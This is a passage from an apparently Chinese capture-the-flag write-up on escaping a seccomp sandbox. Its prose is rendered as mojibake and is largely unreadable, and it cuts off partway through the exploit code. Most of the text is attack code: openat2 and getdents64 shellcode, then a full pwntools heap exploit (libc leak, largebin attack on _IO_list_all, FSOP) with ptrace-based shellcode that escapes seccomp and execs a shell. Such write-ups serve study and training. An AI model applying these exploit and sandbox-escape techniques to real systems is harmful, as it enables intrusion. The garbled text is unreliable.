<p>å¯ä»¥çœ‹åˆ°ç¨‹åºå§<code>open</code>å’Œ<code>openat</code>ç»™banäº†ï¼Œäºæ˜¯æˆ‘é©¬ä¸Šæƒ³åˆ°äº†<code>openat2</code>ï¼Œ<code>shellcode</code> å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c66</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x18</span></span><br><span class="line"><span class="string">    push SYS_openat2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov rdi,rax</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    mov edx,0x100</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    mov edi,1</span></span><br><span class="line"><span class="string">    mov rsi,rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>åœ¨æœ¬åœ°æ‰§è¡Œ <code>shellcode</code> åå¯ä»¥é©¬ä¸Šè·å–åˆ°flagï¼Œå¯æ˜¯è¿œç¨‹ä¸è¡Œï¼Œå½“æ—¶æˆ‘è®¤ä¸ºå‡ºé¢˜è€…æŠŠflagçš„æ–‡ä»¶åç»™æ”¹äº†ï¼Œæ‰€ä»¥æˆ‘å†™äº†ä»¥ä¸‹ <code>shellcode</code> æ¥è·å–å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, 0x2f2e</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    sub rdi, 100</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    mov rdx, rsp</span></span><br><span class="line"><span class="string">    mov r10, 0x18</span></span><br><span class="line"><span class="string">    push SYS_openat2</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode += asm(shellcraft.getdents64(<span class="number">3</span>, heap_base + <span class="number">0x300</span>, <span class="number">0x600</span>))</span><br><span class="line">shellcode += asm(shellcraft.write(<span class="number">1</span>, heap_base + <span class="number">0x300</span>, <span class="number">0x600</span>))</span><br></pre></td></tr></table></figure><p>åœ¨æœ¬åœ°æµ‹è¯•æ˜¯æ²¡é—®é¢˜çš„ï¼Œå¯æ˜¯åˆ°è¿œç¨‹å°±ä¾ç„¶ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œåé¢å‘ç°è¿œç¨‹çš„ <code>kernel</code> ç‰ˆæœ¬æ˜¯ <code>5.4</code>ï¼Œè€Œ <code>openat2</code> ç³»ç»Ÿè°ƒç”¨æ˜¯åœ¨ <code>kernel 5.6</code> æ‰å¼•å…¥çš„ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•ä½œåºŸ</p><p>ç„¶åæˆ‘æƒ³åˆ°äº† <code>io_uring</code>ï¼Œå¯æ˜¯ä¾ç„¶æ˜¯æœ¬åœ°èƒ½è·å–flagï¼Œè¿œç¨‹æ— æ³•è·å–flagï¼Œé‚£å¤§æ¦‚ç‡å°±æ˜¯ä¸çŸ¥é“flagçš„è·¯å¾„å’Œæ–‡ä»¶åçš„é—®é¢˜äº†ï¼Œäºæ˜¯æ¯”èµ›ä¸­å°±æ²¡æœ‰åšå‡ºæ¥â€¦â€¦</p><p>èµ›åå†é‡æ–°ä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹é¢˜ç›®ï¼Œå‘ç° <code>seccomp</code> ç¦ç”¨ç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™å¹¶æ²¡æœ‰ç›´æ¥ <code>return KILL</code>ï¼Œè€Œæ˜¯ <code>return TRACE</code>ï¼Œç„¶åæˆ‘åœ¨é¡¹ç›® <code>The Linux Kernel documentation</code> ä¸Šæ‰¾åˆ°äº†å¯¹äºè¯¥è¿”å›å€¼çš„æè¿°ï¼š</p><blockquote><p>SECCOMP_RET_TRACE:<br>When returned, this value will cause the kernel to attempt to notify a ptrace()-based tracer prior to executing the system call. If there is no tracer present, -ENOSYS is returned to userland and the system call is not executed.<br>A tracer will be notified if it requests PTRACE_O_TRACESECCOMP using ptrace(PTRACE_SETOPTIONS). The tracer will be notified of a PTRACE_EVENT_SECCOMP and the SECCOMP_RET_DATA portion of the BPF program return value will be available to the tracer via PTRACE_GETEVENTMSG.<br>The tracer can skip the system call by changing the syscall number to -1. Alternatively, the tracer can change the system call requested by changing the system call to a valid syscall number. If the tracer asks to skip the system call, then the system call will appear to return the value that the tracer puts in the return value register.<br>The seccomp check will not be run again after the tracer is notified. (This means that seccomp-based sandboxes MUST NOT allow use of ptrace, even of other sandboxed processes, without extreme care; ptracers can use this mechanism to escape.)</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æœ‰åŠæ³•å¯¹ <code>seccomp</code> è¿›è¡Œé€ƒé€¸ï¼Œå…¶å…·ä½“åšæ³•ä¸ºï¼šä½¿ç”¨ <code>fork</code> å¼€ä¸€ä¸ªå­è¿›ç¨‹ï¼Œå­è¿›ç¨‹éœ€è¦ <code>ptrace(PTRACE_TRACEME, 0, 0,0);</code> æ¥å…è®¸è‡ªå·±è¢«çˆ¶è¿›ç¨‹è¿½è¸ªï¼Œçˆ¶è¿›ç¨‹éœ€ä½¿ç”¨ <code>ptrace(PTRACE_ATTACH, pid, 0, 0);</code> æ¥è¿½è¸ªå­è¿›ç¨‹ã€‚ç„¶åçˆ¶è¿›ç¨‹åœ¨ <code>wait()</code> é˜»å¡ç­‰å¾…å­è¿›ç¨‹å‘èµ·ç³»ç»Ÿè°ƒç”¨ã€‚ä¸€æ—¦æ•æ‰åˆ°ï¼Œåˆ™å­è¿›ç¨‹é˜»å¡ï¼Œçˆ¶è¿›ç¨‹ç»§ç»­è¿è¡Œï¼Œæ­¤æ—¶éœ€ç”¨ <code>ptrace(PTRACE_0_SUSPEND_SEECOMP, pid, 0, PTRACE_0_TRACESECCOMP);</code> å°†è¢« <code>TRACE</code> ç³»ç»Ÿçš„è°ƒç”¨æ”¹ä¸ºå…è®¸è¿è¡Œï¼Œç„¶å <code>ptrace(PTRACE_SCONT);</code> æ¥æ¢å¤å­è¿›ç¨‹çš„ç³»ç»Ÿè°ƒç”¨æ‰§è¡Œã€‚ç”±äºæˆ‘ä»¬ä¸çŸ¥é“ <code>flag</code> çš„è·¯å¾„å’Œæ–‡ä»¶åæ˜¯ä»€ä¹ˆï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨ <code>execve</code> æ¥æ‹¿ <code>shell</code>, <code>exp</code> å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>, <span class="string">&quot;./pwn&quot;</span>],</span><br><span class="line">        env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="comment"># p = process([&#x27;./libc.so&#x27;,&#x27;./pwn&#x27;])</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># p=remote(&#x27;49.234.30.109&#x27;,9999)</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;wt.exe&#x27;, &#x27;-w&#x27;, &quot;0&quot;, &quot;sp&quot;, &quot;-d&quot;, &quot;.&quot;, &quot;wsl.exe&quot;, &quot;-d&quot;, &quot;Ubuntu-20.04&quot;, &quot;bash&quot;, &quot;-c&quot;]</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ld = ELF(&#x27;./ld-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">global</span> heap_base</span><br><span class="line">    <span class="keyword">global</span> libc_base</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> temp</span><br><span class="line">    <span class="keyword">global</span> stack</span><br><span class="line">    <span class="keyword">global</span> leak</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;5. Exit&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bye</span>():</span><br><span class="line">    meau(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,Content</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Content&#x27;</span>)</span><br><span class="line">    p.send(Content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x290</span></span><br><span class="line">lg(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1f6cc0</span></span><br><span class="line">lg(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x520</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x550</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">bin</span> = libc_base + <span class="number">0x1f70f0</span></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="built_in">bin</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x550</span>)</span><br><span class="line"></span><br><span class="line">order2 = <span class="string">b&#x27;h\x00&#x27;</span>[::-<span class="number">1</span>].<span class="built_in">hex</span>()</span><br><span class="line">order1 = <span class="string">b&#x27;/bin/bas&#x27;</span>[::-<span class="number">1</span>].<span class="built_in">hex</span>()</span><br><span class="line">shellcode = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Step 1: fork a new process */</span></span><br><span class="line"><span class="string">    mov rax, 57             /* syscall number for fork (on x86_64) */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke fork() */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax           /* check if return value is 0 (child) or positive (parent) */</span></span><br><span class="line"><span class="string">    js _exit                /* if fork failed, exit */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Step 2: If parent process, attach to child process */</span></span><br><span class="line"><span class="string">    cmp rax, 0              /* are we the child process? */</span></span><br><span class="line"><span class="string">    je child_process        /* if yes, jump to child_process */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">parent_process:</span></span><br><span class="line"><span class="string">    /* Store child PID */</span></span><br><span class="line"><span class="string">    mov r8,rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rdi = child PID */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Attach to child process */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    mov rdi, 0x10           /* PTRACE_ATTACH */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no data */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_ATTACH, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">monitor_child:</span></span><br><span class="line"><span class="string">    /* Wait for the child to stop */</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, r8            /* rdi = child PID */</span></span><br><span class="line"><span class="string">    mov rsi, rsp            /*  no status*/</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no rusage */</span></span><br><span class="line"><span class="string">    mov rax, 61             /* syscall number for wait4 */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke wait4() */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Set ptrace options */</span></span><br><span class="line"><span class="string">    mov rax, 110</span></span><br><span class="line"><span class="string">    syscall    </span></span><br><span class="line"><span class="string">    mov rdi, 0x4200         /* PTRACE_SETOPTIONS */</span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rsi = child PID */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    mov r10, 0x00000080     /* PTRACE_O_TRACESECCOMP */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_SETOPTIONS, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Allow the child process to continue */</span></span><br><span class="line"><span class="string">    mov rax, 110</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    mov rdi, 0x7            /* PTRACE_CONT */</span></span><br><span class="line"><span class="string">    mov rsi, r8            /* rsi = child PID */</span></span><br><span class="line"><span class="string">    xor rdx, rdx            /* no options */</span></span><br><span class="line"><span class="string">    xor r10, r10            /* no data */</span></span><br><span class="line"><span class="string">    mov rax, 101            /* syscall number for ptrace */</span></span><br><span class="line"><span class="string">    syscall                 /* invoke ptrace(PTRACE_CONT, child_pid, 0, 0) */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Loop to keep monitoring the child */</span></span><br><span class="line"><span class="string">    jmp monitor_child</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">child_process:</span></span><br><span class="line"><span class="string">    /* Child process code here */</span></span><br><span class="line"><span class="string">    /* For example, we could execute a shell or perform other actions */</span></span><br><span class="line"><span class="string">    /* To keep it simple, let&#x27;s just execute `/bin/sh` */</span></span><br><span class="line"><span class="string">                </span></span><br><span class="line"><span class="string">    /* sleep(5) */</span></span><br><span class="line"><span class="string">    /* push 0 */</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    dec byte ptr [rsp]</span></span><br><span class="line"><span class="string">    /* push 5 */</span></span><br><span class="line"><span class="string">    push 5</span></span><br><span class="line"><span class="string">    /* nanosleep(requested_time=&#x27;rsp&#x27;, remaining=0) */</span></span><br><span class="line"><span class="string">    mov rdi, rsp</span></span><br><span class="line"><span class="string">    xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">    /* call nanosleep() */</span></span><br><span class="line"><span class="string">    push SYS_nanosleep /* 0x23 */</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, 0x<span class="subst">&#123;order2&#125;</span>  /* &quot;/bin/sh&quot; */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rax, 0x<span class="subst">&#123;order1&#125;</span>  /* &quot;/bin/sh&quot; */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    mov rdi, rsp    </span></span><br><span class="line"><span class="string">    mov rsi, 0</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    mov rax, 59             /* syscall number for execve */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp child_process</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">_exit:</span></span><br><span class="line"><span class="string">    /* Exit the process */</span></span><br><span class="line"><span class="string">    mov rax, 60             /* syscall number for exit */</span></span><br><span class="line"><span class="string">    xor rdi, rdi            /* status 0 */</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,shellcode)</span><br><span class="line"></span><br><span class="line">target = libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">magic_gadget = libc_base + <span class="number">0x000000000008c385</span></span><br><span class="line">mprotect = libc_base + libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">pop_rax_call_rax = libc_base + <span class="number">0x000000000015f288</span></span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span 